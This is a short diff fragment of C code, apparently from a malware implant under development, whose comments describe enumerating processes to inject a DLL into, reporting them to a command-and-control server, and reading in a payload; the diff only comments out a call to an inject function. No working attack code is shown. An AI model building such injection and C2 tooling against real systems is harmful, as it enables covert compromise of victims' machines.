@@ -18,8 +18,11 @@ INT main()
 
     // First, parse processes on the system we can see to inject our DLL into; send these back to our C2 to see which to inject into
 
+    // Read in payload; get size
+     
+    
     // lets just test inject first to get that working 
-    status = inject(0);
+    //status = inject(0);
 
 
 
